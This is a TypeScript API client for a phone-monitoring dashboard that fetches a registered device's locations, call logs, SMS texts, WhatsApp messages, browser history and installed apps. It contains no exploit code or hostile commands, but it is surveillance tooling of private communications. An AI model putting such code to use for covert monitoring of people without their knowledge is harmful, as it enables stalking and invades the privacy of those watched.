import axios from 'axios'

const http = axios.create({ baseURL: '/api/v1' })

// Attach JWT token to every request
http.interceptors.request.use(cfg => {
  const token = localStorage.getItem('token')
  if (token) cfg.headers.Authorization = `Bearer ${token}`
  return cfg
})

// Redirect to login on 401 (token expired or invalid)
http.interceptors.response.use(
  res => res,
  err => {
    if (err?.response?.status === 401) {
      localStorage.removeItem('token')
      window.location.href = '/login'
    }
    return Promise.reject(err)
  }
)

// Types
export interface Device       { id: number; name: string; deviceToken: string; registeredAt: string; lastActivityAt?: number; isShared: boolean; hasPIN: boolean; lastPinUsedAt?: number }
export interface LocationDto  { latitude: number; longitude: number; accuracy: number; timestamp: number }
export interface CallLogDto   { number: string; name: string; type: number; date: number; duration: number }
export interface SmsDto       { address: string; body: string; date: number; type: number }
export interface WhatsAppDto      { appPackage: string; appName: string; appIcon?: string; sender: string; message: string; timestamp: number }
export interface WhatsAppChatDto  { chat: string; sender: string; message: string; messageTime?: string; timestamp: number }
export interface InstalledAppDto  { packageName: string; appName: string; version: string; installedAt: number; lastSeenAt: number; iconBase64?: string }
export interface MusicPlayDto     { appPackage: string; trackTitle: string; artistName: string; albumName?: string; durationMs?: number; albumArt?: string; timestamp: number }
export interface BrowserHistoryDto { url: string; title: string; browser: string; iconBase64?: string; timestamp: number }
export interface Paginated<T>      { items: T[]; total: number }

// Auth
export const login    = (email: string, password: string) =>
  http.post<{ token: string; name: string; email: string }>('/auth/login', { email, password })

export const register = (email: string, password: string, name: string) =>
  http.post<{ token: string; name: string; email: string }>('/auth/register', { email, password, name })

// Devices
export const getDevices       = ()                                    => http.get<Device[]>('/dashboard/devices')
/** name + optional token. If token supplied, links existing device (family sharing). */
export const registerDevice   = (name: string, token?: string)        => http.post<Device>('/dashboard/devices', { name, token: token || null })

/** Update device name and/or PIN. Pass clearPin=true to remove the PIN. */
export const updateDevice = (id: number, name?: string, pin?: string, clearPin?: boolean) =>
  http.patch<Device>(`/dashboard/devices/${id}`, { name: name ?? null, pin: pin ?? null, clearPin: clearPin ?? false })

// Device data
export const getLatestLocation = (deviceId: number) =>
  http.get<LocationDto>(`/dashboard/devices/${deviceId}/location/latest`)

export const getLocations = (deviceId: number, limit = 200) =>
  http.get<LocationDto[]>(`/dashboard/devices/${deviceId}/locations?limit=${limit}`)

export const getCallLogs  = (deviceId: number, page = 1, pageSize = 20) =>
  http.get<Paginated<CallLogDto>>(`/dashboard/devices/${deviceId}/calls?page=${page}&pageSize=${pageSize}`)

export const getSmsLogs   = (deviceId: number, page = 1, pageSize = 20) =>
  http.get<Paginated<SmsDto>>(`/dashboard/devices/${deviceId}/sms?page=${page}&pageSize=${pageSize}`)

export const getWhatsApp  = (deviceId: number, page = 1, pageSize = 20) =>
  http.get<Paginated<WhatsAppDto>>(`/dashboard/devices/${deviceId}/whatsapp?page=${page}&pageSize=${pageSize}`)

export const getWhatsAppChats = (deviceId: number) =>
  http.get<WhatsAppChatDto[]>(`/dashboard/devices/${deviceId}/whatsapp/chats`)

export const getInstalledApps = (deviceId: number) =>
  http.get<InstalledAppDto[]>(`/dashboard/devices/${deviceId}/apps`)

export const getMusicHistory = (deviceId: number, page = 1, pageSize = 20) =>
  http.get<Paginated<MusicPlayDto>>(`/dashboard/devices/${deviceId}/music?page=${page}&pageSize=${pageSize}`)

export const getBrowserHistory = (deviceId: number, page = 1, pageSize = 20) =>
  http.get<Paginated<BrowserHistoryDto>>(`/dashboard/devices/${deviceId}/browser?page=${page}&pageSize=${pageSize}`)
